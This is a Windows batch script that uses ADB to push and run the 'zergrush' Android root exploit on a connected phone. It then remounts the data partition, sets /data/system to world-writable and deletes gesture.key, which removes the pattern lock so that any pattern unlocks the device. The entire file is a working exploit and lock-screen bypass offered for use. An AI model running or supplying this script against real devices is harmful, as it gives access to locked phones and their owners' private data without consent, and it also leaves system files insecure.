@echo off
cd "%~dp0"

echo [*] Beah! Block Patron Eraser script (Windows version)
echo [*] Exploit copyright (C) 2011 Revolutionary
echo [*] Scripting for Beah! Block Patron Eraser by Beah!
echo [*]
echo [*] Before continuing, ensure USB debugging is enabled, that you
echo [*] have the latest drivers installed, and that your phone is
echo [*] connected via USB.
echo [*]
echo [*] Press enter to continue with your phone...
echo [*] 
pause

echo [*] Waiting for device...
adb kill-server
adb devices
adb wait-for-device

echo [*] Device found.

echo [*] Pushing exploit binary...
echo Seccion A-1
adb push zergrush /data/local/tmp/zergrush
echo Seccion A-2
adb shell "chmod 755 /data/local/tmp/zergrush"
pause
echo [*] Running exploit...
echo Seccion B-1
adb shell "echo exit | /data/local/tmp/zergrush"
 
:: Install the goods
echo [*] Installing unlock root tools... 
echo Seccion C-1
adb shell /data/local/tmp/sh -c "mount -orw,remount /dev/block/data /data"
echo Seccion C-2
adb shell /data/local/tmp/sh -c "chmod 777 /data/system"
echo Seccion C-3
adb shell rm /data/system/gesture.key


echo [*] Rebooting...
echo Seccion D-1
adb reboot

adb wait-for-device
echo [*] Proccess complete, try any random patron to unblock it.
echo [+] Please, give me your feed back. FB@Beah!
echo [*] Press any key to exit.
pause
adb kill-server

